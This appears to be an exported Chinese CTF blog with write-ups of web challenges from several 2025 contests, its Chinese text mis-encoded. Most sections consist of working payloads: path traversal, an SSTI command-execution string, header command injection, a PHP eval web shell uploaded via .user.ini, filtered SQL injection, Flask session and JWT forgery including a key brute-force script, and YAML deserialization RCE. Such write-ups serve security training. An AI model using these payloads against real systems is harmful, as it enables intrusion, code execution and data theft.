class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// æ–‡ä»¶åŒ…å«æ¼æ´æ¼”ç¤º</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br><br>    <span class="hljs-comment">// è¯»å–å¹¶åŒ…å«ç”¨æˆ·è¾“å…¥çš„æ–‡ä»¶</span><br><br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&#x27;..&#x27;</span>) === <span class="hljs-literal">false</span>) &#123;<br><br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Access denied.&quot;</span>;<br><br>    &#125;<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No file specified.&quot;</span>;<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>çœ‹æºç åº”è¯¥æ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„é¢˜</p><p>ç”¨dirsearchæ‰«äº†ä¸€ä¸‹ç›®å½•ï¼Œå‘ç°&#x2F;flagï¼Œç›´æ¥åŒ…å«å¹¶æ²¡æœ‰å¾—åˆ°flagï¼Œåº”è¯¥è¦ç”¨ç›®å½•ç©¿è¶Šçš„æ–¹å¼åŒ…å«ï¼Œä½†æ˜¯<code>..</code>è¢«è¿‡æ»¤äº†</p><p>ä¿®æ”¹ä¸»é¢˜åï¼Œç”¨hackbarå‘ç°postä¸­æœ‰themeå‚æ•°ï¼Œä¼ é€’çš„å€¼æ˜¯theme2.phpï¼ŒçŒœæƒ³åº”è¯¥æ˜¯é€šè¿‡æ–‡ä»¶åŒ…å«çš„æ–¹å¼å¼•ç”¨çš„ï¼Œåˆ©ç”¨è¯¥å‚æ•°å°è¯•ç›®å½•ç©¿è¶Šæ‹¿flag</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">theme</span><span class="hljs-operator">=</span>../../../../flag<br></code></pre></td></tr></table></figure><h2 id="ez-SSTI"><a href="#ez-SSTI" class="headerlink" title="ez_SSTI"></a>ez_SSTI</h2><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">payloadï¼š name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[137].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="çœ‹çœ‹ip"><a href="#çœ‹çœ‹ip" class="headerlink" title="çœ‹çœ‹ip"></a>çœ‹çœ‹ip</h2><p>xffå¤´ä¼ªé€ å‘½ä»¤æ‰§è¡Œï¼ŒbpæŠ“ä¸€ä¸ªåŒ…åŠ ä¸€ä¸ªxffå¤´</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">X-Forwarded-For: </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;cat /flag&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="æ€ä¹ˆå¤šäº†ä¸ªæ²¡ç”¨çš„phpæ–‡ä»¶"><a href="#æ€ä¹ˆå¤šäº†ä¸ªæ²¡ç”¨çš„phpæ–‡ä»¶" class="headerlink" title="æ€ä¹ˆå¤šäº†ä¸ªæ²¡ç”¨çš„phpæ–‡ä»¶"></a>æ€ä¹ˆå¤šäº†ä¸ªæ²¡ç”¨çš„phpæ–‡ä»¶</h2><p>.user.inié…ç½®æ–‡ä»¶ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">å…ˆä¸Šä¼ .user.ini<br>auto_prepend_file=shell.txt<br><br>å†ä¸Šä¼ shell.txt<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ly&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br><br>æœ€åé€šè¿‡/uploads/notion.phpæ–‡ä»¶rce<br></code></pre></td></tr></table></figure><h2 id="UploadBaby"><a href="#UploadBaby" class="headerlink" title="UploadBaby"></a>UploadBaby</h2><p>ä¸Šä¼ ä¸€ä¸ªjpgæ–‡ä»¶ï¼ŒbpæŠ“åŒ…æ”¹ä¸ºphpæ–‡ä»¶ç»•è¿‡å‰ç«¯æ£€æµ‹ï¼Œç„¶årce</p><h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs csharp">nss=<span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span>oorrder<span class="hljs-comment">/**/</span><span class="hljs-keyword">by</span><span class="hljs-comment">/**/</span><span class="hljs-number">3</span><span class="hljs-meta">#// åˆ¤æ–­åˆ—æ•°ï¼Œç©ºæ ¼å’Œorè¢«ç½®æ¢ä¸ºç©ºï¼Œç©ºæ ¼é‡‡ç”¨/**/ç»•è¿‡ï¼Œoré‡‡ç”¨åŒå†™ç»•è¿‡</span><br>nss=<span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span>ununionion<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">/**/</span>limit<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">1</span><span class="hljs-meta">#// åˆ¤æ–­å›æ˜¾ä½ï¼Œunionè¢«ç½®æ¢ä¸ºç©ºï¼Œé‡‡ç”¨åŒå†™ç»•è¿‡</span><br>nss=<span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span>ununionion<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,version(),(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>infoorrmation_schema.tables<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=database())<span class="hljs-comment">/**/</span>limit<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">1</span><span class="hljs-meta">#// æŸ¥è¡¨å</span><br>nss=<span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span>ununionion<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,version(),(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(column_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>infoorrmation_schema.columns<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=database()<span class="hljs-comment">/**/</span>anandd<span class="hljs-comment">/**/</span>table_name=<span class="hljs-string">&quot;NSS_tb&quot;</span>)<span class="hljs-comment">/**/</span>limit<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">1</span><span class="hljs-meta">#// æŸ¥å­—æ®µåï¼Œandè¢«ç½®æ¢ä¸ºç©ºï¼Œé‡‡ç”¨åŒå†™ç»•è¿‡</span><br>nss=<span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span>ununionion<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,Secr3t,flll444g<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>NSS_db.NSS_tb<span class="hljs-comment">/**/</span>limit<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">1</span><span class="hljs-meta">#// æ‹¿flag</span><br></code></pre></td></tr></table></figure><h2 id="è¿™æ˜¯ä»€ä¹ˆï¼ŸSQL-ï¼æ³¨ä¸€ä¸‹-ï¼"><a href="#è¿™æ˜¯ä»€ä¹ˆï¼ŸSQL-ï¼æ³¨ä¸€ä¸‹-ï¼" class="headerlink" title="è¿™æ˜¯ä»€ä¹ˆï¼ŸSQL ï¼æ³¨ä¸€ä¸‹ ï¼"></a>è¿™æ˜¯ä»€ä¹ˆï¼ŸSQL ï¼æ³¨ä¸€ä¸‹ ï¼</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>)))))) <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span>#//åˆ¤æ–­åˆ—æ•°<br><span class="hljs-number">1</span>)))))) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata)#// æŸ¥åº“å<br><span class="hljs-number">1</span>)))))) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=&quot;ctftraining&quot;)#//æŸ¥è¡¨å<br><span class="hljs-number">1</span>)))))) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=&quot;ctftraining&quot; <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=&quot;flag&quot;)#//æŸ¥å­—æ®µå<br><span class="hljs-number">1</span>)))))) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,flag <span class="hljs-keyword">from</span> ctftraining.flag#//æ‹¿flag<br></code></pre></td></tr></table></figure><h2 id="flask-jwt"><a href="#flask-jwt" class="headerlink" title="flask?jwt?"></a>flask?jwt?</h2><p>sessionä¼ªé€ </p><p>æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç™»å…¥ï¼Œå°è¯•æ‹¿flagï¼Œæç¤ºâ€œä¸ä¸ä¸ï¼Œä½ ä¸æ˜¯ adminâ€ï¼Œå¯èƒ½éœ€è¦è¿›è¡Œsessionä¼ªé€ ï¼Œä½†æ˜¯éœ€è¦ä¸€ä¸ªå¯†é’¥</p><p>å›åˆ°ç™»å…¥é¡µé¢ï¼Œæœ‰ä¸€ä¸ªå¿˜è®°å¯†ç ï¼Œåœ¨å¿˜è®°å¯†ç çš„æºç ä¸­å‘ç°è¢«æ³¨é‡Šçš„secret</p><p><img src="/../images/2025SWPU-NSSCTF%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/flask_jwt.png"></p><p>ç”¨<a href="https://github.com/noraj/flask-session-cookie-manager">flask_session_cookie_manager</a>è¿›è¡Œsessionä¼ªé€ </p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">python flask_session_cookie_manager3.py decode <span class="hljs-punctuation">-</span>s <span class="hljs-string">&quot;th3f1askisfunny&quot;</span> <span class="hljs-punctuation">-</span>c <span class="hljs-string">&quot;.eJwlzjsOwjAMANC7eGZI_avTy1RObAvWlk6Iu1OJ9U3vA3sdeT5hex9XPmB_BWwweFElEfEKEU4MJp1DdEnp1DIZJZ1DVaxTkLiZ8zSjFqMWSqmwPqpNb1JrdyvEvhbbbL2IKW42GyMwsKHjaqo1B_GciGlwR64zj_8G4fsDmhUvJA.aODenw.MuqX9Q7tgQmax7LBB2YB9lCqCd0&quot;</span><br><br>&#123;&#x27;_fresh&#x27;<span class="hljs-punctuation">:</span> True<span class="hljs-punctuation">,</span> &#x27;_id&#x27;<span class="hljs-punctuation">:</span> &#x27;b<span class="hljs-number">41663555</span>afd554e2d436cb561e<span class="hljs-number">5930</span>ee425ea4d<span class="hljs-number">665893</span>d35a88a4c<span class="hljs-number">8830</span>dbf13e5fd89bf0ca05f79a8f<span class="hljs-number">2297</span>f48c09f343d05f88bbd2d202a<span class="hljs-number">2786</span>6fcb34cc22e8&#x27;<span class="hljs-punctuation">,</span> &#x27;_user_id&#x27;<span class="hljs-punctuation">:</span> &#x27;2&#x27;&#125;<br></code></pre></td></tr></table></figure><p>çŒœæƒ³adminçš„<code>_user_id</code>ä¸º1</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scilab">python flask_session_cookie_manager3.py encode -s <span class="hljs-string">&quot;th3f1askisfunny&quot;</span> -t <span class="hljs-string">&quot;&#123;&#x27;</span>_fresh&#x27;: True, <span class="hljs-string">&#x27;_id&#x27;</span>: <span class="hljs-string">&#x27;b41663555afd554e2d436cb561e5930ee425ea4d665893d35a88a4c8830dbf13e5fd89bf0ca05f79a8f2297f48c09f343d05f88bbd2d202a27866fcb34cc22e8&#x27;</span>, <span class="hljs-string">&#x27;_user_id&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>&#125;<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">.eJwlzjsOwjAMANC7ZGZI_IvTy1RxbAvWlk6Iu1OJ9U3vU_Y84nyW7X1c8Sj7y8tWjJoIMvNMZ6YAJ5RlLC14YI0g4JjkIqwDHXmqTlqqWN2yYXC6Dsu6ZuXsY2oCjJ6kq45EQr9Z1czBocKEriK5DGktgNByR64zjv-mle8PmhIvIw.aODl7g.3ey_KMk34hzHH8utCoSsWvbNvqk</span><br></code></pre></td></tr></table></figure><p>å°†åŸsessionæ›¿æ¢ï¼Œå†å°è¯•æ‹¿flagï¼Œå³å¯æˆåŠŸ</p><h2 id="easy-unser"><a href="#easy-unser" class="headerlink" title="easy_unser"></a>easy_unser</h2><p>å¿«é€Ÿææ„ï¼šä¿®æ”¹å±æ€§ä¸ªæ•°ç»•è¿‡<code>__wakeup()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">body</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$want</span> = <span class="hljs-string">&#x27;php://filter/resource=f14g.php&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$todonothing</span> = <span class="hljs-string">&#x27;12&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> body;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>ç”Ÿæˆpayloadï¼Œå°†å±æ€§ä¸ªæ•°ä¿®æ”¹åæäº¤å³å¯æ‹¿åˆ°flag</p><h2 id="ç†æƒ³å›½"><a href="#ç†æƒ³å›½" class="headerlink" title="ç†æƒ³å›½"></a>ç†æƒ³å›½</h2><h2 id="Maxser-Revenge"><a href="#Maxser-Revenge" class="headerlink" title="Maxser Revenge"></a>Maxser Revenge</h2>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025é•¿åŸæ¯åˆèµ›</title>
    <link href="/2025/09/15/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B/"/>
    <url>/2025/09/15/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="æ–‡æ›²ç­¾å­¦"><a href="#æ–‡æ›²ç­¾å­¦" class="headerlink" title="æ–‡æ›²ç­¾å­¦"></a>æ–‡æ›²ç­¾å­¦</h2><p>æ ¹æ®æç¤ºâ€œé•¿æŒ‰Fné”®å¯æ¿€æ´»ç‰¹æ®Šæ¨¡å¼â€ï¼Œç„¶åè¾“å…¥<code>#HELP</code>æŸ¥çœ‹å¸®åŠ©</p><p><img src="/../images/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B/web1_1.png"></p><p>listæŸ¥çœ‹ç¬”è®°åˆ—è¡¨</p><p><img src="/../images/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B/web1_2.png"></p><p>read HINTè¯»å–å†…å®¹</p><p><img src="/../images/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B/web1_3.png"></p><p>å…¬ä¼—å·æç¤ºâ€œflagåœ¨&#x2F;flagç›®å½•ä¸‹ï¼Œå¯ä»¥å°è¯•ç›®å½•ç©¿è¶Šæ¼æ´æ¥è¯»å–å®ƒã€‚ä¼šè¿‡æ»¤<code>../</code>ï¼Œå¯ä»¥ä½¿ç”¨åŒå†™æ¥ç»•è¿‡ã€‚æ–‡ä»¶åæœ‰å¤§å°åŒºåˆ†ã€‚â€</p><p><code>read ....//....//....//....//flag</code>æ‹¿flag</p><p><img src="/../images/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B/web1_4.png"></p><h2 id="EZ-upload"><a href="#EZ-upload" class="headerlink" title="EZ_upload"></a>EZ_upload</h2><h2 id="SeRce"><a href="#SeRce" class="headerlink" title="SeRce"></a>SeRce</h2>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025æ¹¾åŒºæ¯</title>
    <link href="/2025/09/08/2025%E6%B9%BE%E5%8C%BA%E6%9D%AF/"/>
    <url>/2025/09/08/2025%E6%B9%BE%E5%8C%BA%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="ez-python"><a href="#ez-python" class="headerlink" title="ez_python"></a>ez_python</h1><p>å°è¯•ä¸Šä¼ æ–‡ä»¶å¹¶æ‰§è¡Œï¼Œæç¤ºâ€Permission Denied: admin onlyâ€</p><p>æŠ“åŒ…å‘ç°</p><p><img src="/../images/2025%E6%B9%BE%E5%8C%BA%E6%9D%AF/ez_python.png"></p><p>åº”è¯¥å¯ä»¥è¿›è¡Œjwtä¼ªé€ ï¼Œåœ¨<a href="https://www.json.cn/jwt">jwtåŠ &#x2F;è§£å¯†</a>ç½‘ç«™ä¸­å°†payloadä¸­çš„roleå­—æ®µæ”¹ä¸ºadminï¼Œå°†åŸtokenæ›¿æ¢åé‡æ”¾</p><p>ä»ç„¶æŠ¥é”™ï¼Œä½†æ˜¯æœ‰æç¤ºâ€Key starts with &quot;@o70xO$0%#qR9#**&quot;. The 2 missing chars are alphanumeric (letters and numbers).â€ï¼Œå¯†é’¥ç¼ºå¤±ä¸¤ä¸ªå­—ç¬¦(å­—æ¯å’Œæ•°å­—)ï¼Œç›´æ¥çˆ†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">import</span> string<br><br>token = <span class="hljs-string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.karYCKLm5IhtINWMSZkSe1nYvrhyg5TgsrEm7VR1D0E&quot;</span><br>prefix = <span class="hljs-string">&quot;@o70xO$0%#qR9#&quot;</span><br>char_set = string.ascii_letters + string.digits<br><br><span class="hljs-keyword">for</span> c1 <span class="hljs-keyword">in</span> char_set:<br>    <span class="hljs-keyword">for</span> c2 <span class="hljs-keyword">in</span> char_set:<br>        key = prefix + c1 + c2<br>        <span class="hljs-keyword">try</span>:<br>            payload = jwt.decode(token, key, algorithms=[<span class="hljs-string">&#x27;HS256&#x27;</span>])<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;key: &quot;</span>,key)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload: &quot;</span>,payload)<br>            payload[<span class="hljs-string">&#x27;role&#x27;</span>] = <span class="hljs-string">&#x27;admin&#x27;</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;changed payload: &#x27;</span>, payload)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;last token: &quot;</span>, jwt.encode(payload, key, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>))<br>            exit(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">except</span> jwt.InvalidTokenError:<br>            <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p>å°†åŸtokenæ›¿æ¢åï¼Œå†æ¬¡é‡æ”¾</p><p>æ¥ä¸‹æ¥è¿›è¡Œ<a href="https://xz.aliyun.com/news/7518">yamlååºåˆ—</a>åŒ–æ‹¿flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">!!python/object/apply:<span class="hljs-built_in">eval</span> [<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /f1111ag&#x27;).read()&quot;</span>]<br></code></pre></td></tr></table></figure><p><img src="/../images/2025%E6%B9%BE%E5%8C%BA%E6%9D%AF/ez_python2.png"></p><p>æœ€åçœ‹ä¸€ä¸‹æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify, render_template_string<br><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> yaml<br><span class="hljs-keyword">import</span> os<br><br>app = Flask(__name__)<br><br>JWT_SECRET = <span class="hljs-string">&quot;@o70xO$0%#qR9#m0&quot;</span><br>JWT_ALGO = <span class="hljs-string">&quot;HS256&quot;</span><br><br>FORBIDDEN = [<span class="hljs-string">&#x27;__&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;read&#x27;</span>, <span class="hljs-string">&#x27;write&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;communicate&#x27;</span>,<br>             <span class="hljs-string">&#x27;Popen&#x27;</span>, <span class="hljs-string">&#x27;decode&#x27;</span>, <span class="hljs-string">&quot;\\&quot;</span>]<br>HTML_PAGE = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">&lt;head&gt;</span><br><span class="hljs-string">    &lt;title&gt;Vault&lt;/title&gt;</span><br><span class="hljs-string">    &lt;style&gt;</span><br><span class="hljs-string">        body &#123; font-family: &quot;Segoe UI&quot;, sans-serif; background-color: #f4f4f4; padding: 40px; text-align: center; &#125;</span><br><span class="hljs-string">        #user-info &#123; margin-bottom: 40px; font-weight: bold; font-size: 18px; color: #333; &#125;</span><br><span class="hljs-string">        